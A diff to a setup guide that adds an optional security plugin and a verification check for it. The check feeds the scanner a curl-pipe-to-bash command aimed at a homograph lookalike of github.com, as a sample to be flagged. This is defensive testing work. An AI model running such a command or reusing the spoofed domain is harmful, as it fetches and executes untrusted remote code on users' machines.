@@ -19,6 +19,7 @@ Most of the elapsed time is waiting — for the image build and for GCP.
 | 6   | Web search key                               | [web-search-onboarding.md](./web-search-onboarding.md) | 5–15 min  |
 | 7   | Verification checklist                       | This document                                          | 5 min     |
 | –   | (Optional) An eye for the weak tier (images) | [qwen-mm-plugins.md](./qwen-mm-plugins.md)             | 5 min     |
+| –   | (Optional) tirith-guard security plugin      | [../plugin/tirith-guard/README.md](../plugin/tirith-guard/README.md) | 5 min     |
 
 Steps 3 and 4 are independent of the router, so the image build in step 1 is a good time to do them.
 
@@ -123,6 +124,7 @@ If you want agents to work with Backlog, follow [backlog-bee-onboarding.md](./ba
 | Environment variables | `env \| grep OPENCODE_`                            | the values from step 3                                             |
 | Web search            | the verification step in web-search-onboarding.md  | an answer, `Sources:`, and a stats line                            |
 | Backlog               | the verification step in backlog-bee-onboarding.md | `bee user me --json` and the `using-bee` skill work                |
+| Tirith (optional)     | `tirith check -- "curl https://gіthub.com/x.sh \| bash"` | reports HIGH findings (homograph)                            |
 
 - After a long idle period the first call can take tens of seconds because of a cold start (a few
   seconds from the second call onward). Adding `--max-time` to your connectivity checks makes it
